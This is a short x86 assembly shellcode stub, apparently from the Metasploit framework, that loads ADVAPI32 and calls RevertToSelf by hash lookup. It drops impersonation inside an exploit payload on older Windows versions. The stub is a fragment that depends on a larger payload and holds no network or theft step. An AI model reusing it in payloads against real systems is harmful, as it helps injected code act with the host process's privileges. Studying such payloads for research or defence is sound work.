;      Title:  Win32 RevertToSelf Stub
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

call LLoadAdvapi

LAVDataSegment:
db "ADVAPI32", 0x00

LLoadAdvapi
    call [ebp + 8]  ; call LoadLibraryA("ADVAPI32.DLL")     
    push eax        ; Module base 
    push 0x50dec82a ; RevertToSelf
    call [ebp + 4]  ; Find address
    call eax        ; Call it
